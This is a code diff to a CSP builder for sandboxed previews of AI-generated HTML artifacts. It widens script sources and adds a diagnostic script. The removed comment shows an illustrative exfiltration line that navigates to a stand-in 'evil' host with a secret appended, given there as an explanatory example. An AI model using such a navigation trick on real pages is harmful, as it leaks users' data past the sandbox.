@@ -1,26 +1,17 @@
 import {
   ARTIFACT_PERMISSION_MAX_SOURCES,
+  WEB_PREVIEW_DIAGNOSTIC_MESSAGE_TYPE,
   looksLikeInteractiveHtml,
   type ArtifactHtmlPermissionsT,
 } from '@kodax-space/space-ipc-schema';
 
 export { looksLikeInteractiveHtml };
 
-// C12: a small, curated set of widely-mirrored, HTTPS CDN origins allowed for `script-src` BY
-// DEFAULT. LLM-generated artifacts routinely reference `<script src="https://cdn.tailwindcss.com">`
-// (or unpkg / jsdelivr / cdnjs) and cannot compute an offline SRI hash, so the SRI-gated `scripts`
-// permission is impractical for the model to satisfy — without this, such artifacts render blank.
-// Containment: the iframe sandbox (null origin, no allow-same-origin, separate process) means even
-// arbitrary script here has ZERO access to Node/Electron/IPC, and the default `connect-src 'none'` /
-// `form-action 'none'` block network/form exfil. CAVEAT: this does NOT make the frame
-// exfil-proof — a script can still self-navigate its own browsing context
-// (`location = 'https://evil/?d='+secret`), which no CSP directive or sandbox token gates; this is a
-// PRE-EXISTING channel already reachable via the always-present `'unsafe-inline'`, not new to this
-// allowlist. Note too that jsdelivr/unpkg are open-publish (anyone can publish), unlike the narrower
-// cdn.tailwindcss.com / PR-moderated cdnjs — widening script-src to them lowers the bar for smuggling
-// a plausible-looking exploit past review. Accepted as a deliberate tradeoff to unblank CDN artifacts;
-// full closure would need per-artifact will-frame-navigate interception (tracked as follow-up).
-// (Declared before INTERACTIVE_HTML_CSP below, which calls buildInteractiveHtmlCsp() at module load.)
+// Common generated pages depend on these CDN origins. Authored HTTPS script origins are also
+// inferred per document so browser-visible presentations do not collapse. Containment stays in the
+// outer boundary: the iframe has an opaque origin and no Node/Electron/IPC or parent access;
+// connect/forms/frames remain policy-gated; main-process navigation guards deny child escape.
+// Declared before INTERACTIVE_HTML_CSP, which calls buildInteractiveHtmlCsp at module load.
 const DEFAULT_SCRIPT_CDNS: readonly string[] = [
   'https://cdn.tailwindcss.com',
   'https://cdn.jsdelivr.net',
@@ -72,9 +63,7 @@ function sourceList(sources: readonly string[], fallback: string): string {
 }
 
 function originList(rawSources: readonly string[] | undefined): string[] {
-  return (rawSources ?? [])
-    .map(originSource)
-    .filter((source): source is string => source !== null);
+  return (rawSources ?? []).map(originSource).filter((source): source is string => source !== null);
 }
 
 function connectList(rawSources: readonly string[] | undefined): string[] {
@@ -100,12 +89,22 @@ function escapeAttribute(value: string): string {
     .replace(/>/g, '&gt;');
 }
 
-function cspMeta(permissions?: ArtifactHtmlPermissionsT): string {
-  return `<meta http-equiv="Content-Security-Policy" content="${escapeAttribute(buildInteractiveHtmlCsp(permissions))}">`;
+function cspMeta(
+  permissions?: ArtifactHtmlPermissionsT,
+  authoredScriptOrigins: readonly string[] = [],
+): string {
+  return `<meta http-equiv="Content-Security-Policy" content="${escapeAttribute(buildInteractiveHtmlCsp(permissions, authoredScriptOrigins))}">`;
 }
 
-export function buildInteractiveHtmlCsp(permissions?: ArtifactHtmlPermissionsT): string {
-  const scripts = scriptList(permissions);
+function diagnosticScript(): string {
+  return `<script data-kodax-preview-runtime>(()=>{const type=${JSON.stringify(WEB_PREVIEW_DIAGNOSTIC_MESSAGE_TYPE)};const clean=(value)=>String(value??'').replace(/[\\r\\n]+/g,' ').slice(0,240);const send=(kind,message,directive)=>{try{parent.postMessage({type,kind,message:clean(message),directive:clean(directive)},'*')}catch{}};const memoryStorage=(name)=>{try{const current=window[name],probe='__kodax_preview_probe__';current.setItem(probe,'1');current.removeItem(probe);return}catch{}const values=new Map(),api={get length(){return values.size},key:(index)=>[...values.keys()][Number(index)]??null,getItem:(key)=>values.has(String(key))?values.get(String(key)):null,setItem:(key,value)=>values.set(String(key),String(value)),removeItem:(key)=>values.delete(String(key)),clear:()=>values.clear()},storage=new Proxy(api,{get:(target,key,receiver)=>typeof key==='string'&&!(key in target)?values.get(key):Reflect.get(target,key,receiver),set:(target,key,value,receiver)=>{if(typeof key==='string'&&!(key in target)){values.set(key,String(value));return true}return Reflect.set(target,key,value,receiver)},deleteProperty:(target,key)=>{if(typeof key==='string'&&!(key in target))return values.delete(key);return false}});try{Object.defineProperty(window,name,{value:storage,configurable:false})}catch{}};memoryStorage('localStorage');memoryStorage('sessionStorage');addEventListener('error',(event)=>{const target=event.target;if(target&&target!==window){const tag=clean(target.tagName||'resource').toLowerCase();send('resource',tag);return}send('runtime',event.message||'Script error')},true);addEventListener('unhandledrejection',(event)=>{const reason=event.reason;send('runtime',reason&&reason.message?reason.message:reason||'Unhandled promise rejection')});addEventListener('securitypolicyviolation',(event)=>send('policy','',event.effectiveDirective||event.violatedDirective||'content-security-policy'));send('ready','')})();</script>`;
+}
+
+export function buildInteractiveHtmlCsp(
+  permissions?: ArtifactHtmlPermissionsT,
+  authoredScriptOrigins: readonly string[] = [],
+): string {
+  const scripts = unique([...scriptList(permissions), ...authoredScriptOrigins]);
   const connects = connectList(permissions?.connect);
   const styles = originList(permissions?.style);
   const imgs = originList(permissions?.img);
@@ -115,7 +114,8 @@ export function buildInteractiveHtmlCsp(permissions?: ArtifactHtmlPermissionsT):
 
   return [
     "default-src 'none'",
-    `script-src ${sourceList(["'unsafe-inline'", ...DEFAULT_SCRIPT_CDNS, ...scripts], "'none'")}`,
+    `script-src ${sourceList(["'unsafe-inline'", 'blob:', ...DEFAULT_SCRIPT_CDNS, ...scripts], "'none'")}`,
+    'worker-src blob:',
     `style-src ${sourceList(["'unsafe-inline'", ...styles], "'none'")}`,
     `img-src ${sourceList(['data:', 'blob:', ...imgs], "'none'")}`,
     `font-src ${sourceList(['data:', ...fonts], "'none'")}`,
@@ -218,6 +218,10 @@ export function inferPassiveHtmlPermissions(html: string): ArtifactHtmlPermissio
         }
       } else if (as === 'font') {
         addOrigin(sets.font, href);
+      } else if (rel.includes('icon') || as === 'image') {
+        addOrigin(sets.img, href);
+      } else if (as === 'audio' || as === 'video') {
+        addOrigin(sets.media, href);
       }
       continue;
     }
@@ -240,21 +244,40 @@ export function inferPassiveHtmlPermissions(html: string): ArtifactHtmlPermissio
     }
   }
 
-  for (const match of html.matchAll(/url\(\s*(?:"([^"]+)"|'([^']+)'|([^)'" ]+))\s*\)/gi)) {
+  const importedStyles = new Set<string>();
+  for (const match of html.matchAll(
+    /@import\s+(?:url\(\s*)?(?:"([^"]+)"|'([^']+)'|([^'"\s;)]+))\s*\)?/gi,
+  )) {
     const raw = match[1] ?? match[2] ?? match[3];
     if (!raw) continue;
+    importedStyles.add(raw);
+    addOrigin(sets.style, raw);
+  }
+
+  for (const match of html.matchAll(/url\(\s*(?:"([^"]+)"|'([^']+)'|([^)'" ]+))\s*\)/gi)) {
+    const raw = match[1] ?? match[2] ?? match[3];
+    if (!raw || importedStyles.has(raw)) continue;
     addOrigin(isFontUrl(raw) ? sets.font : sets.img, raw);
   }
 
   return permissionsFromSets(sets);
 }
 
+function inferAuthoredScriptOrigins(html: string): readonly string[] {
+  const origins = new Set<string>();
+  for (const match of html.matchAll(/<script\b([^>]*)>/gi)) {
+    addOrigin(origins, srcFromAttributes(match[1] ?? ''));
+  }
+  return Array.from(origins);
+}
+
 /**
  * C11: merge the auto-inferred PASSIVE resource permissions (style/img/media/font already present
  * in the markup) with any EXPLICIT permissions the caller supplied. Previously supplying any
  * explicit permission (e.g. `{connect: [...]}` to unblock a fetch) skipped passive inference
- * entirely, so the same artifact's fonts/images silently stopped loading. Active/security-sensitive
- * categories (connect / scripts / forms / popups) stay EXPLICIT-only — they require deliberate intent.
+ * entirely, so the same artifact's fonts/images silently stopped loading. Arbitrary connections,
+ * forms, and popups stay explicit. Authored script origins are inferred separately and remain
+ * confined by the opaque iframe, no-connect default, and navigation guards.
  */
 function mergePassiveWithExplicit(
   inferred: ArtifactHtmlPermissionsT | undefined,
@@ -310,18 +333,21 @@ export function buildInteractiveHtmlSrcDoc(
     inferPassiveHtmlPermissions(html),
     permissions,
   );
-  const meta = cspMeta(effectivePermissions);
+  // Authored HTTPS scripts are presentation dependencies, not an implicit data/API grant.
+  // Origin scope lets an ESM entry point import adjacent chunks; connect-src, navigation,
+  // frames, Electron and parent-page access remain blocked by the inner and outer sandboxes.
+  const bootstrap = `${cspMeta(effectivePermissions, inferAuthoredScriptOrigins(html))}${diagnosticScript()}`;
   const headOpen = htmlWithIntegrity.match(/<head\b[^>]*>/i);
   if (headOpen?.index !== undefined) {
     const insertAt = headOpen.index + headOpen[0].length;
-    return `${htmlWithIntegrity.slice(0, insertAt)}${meta}${htmlWithIntegrity.slice(insertAt)}`;
+    return `${htmlWithIntegrity.slice(0, insertAt)}${bootstrap}${htmlWithIntegrity.slice(insertAt)}`;
   }
 
   const htmlOpen = htmlWithIntegrity.match(/<html\b[^>]*>/i);
   if (htmlOpen?.index !== undefined) {
     const insertAt = htmlOpen.index + htmlOpen[0].length;
-    return `${htmlWithIntegrity.slice(0, insertAt)}<head>${meta}</head>${htmlWithIntegrity.slice(insertAt)}`;
+    return `${htmlWithIntegrity.slice(0, insertAt)}<head>${bootstrap}</head>${htmlWithIntegrity.slice(insertAt)}`;
   }
 
-  return `${meta}${htmlWithIntegrity}`;
+  return `${bootstrap}${htmlWithIntegrity}`;
 }
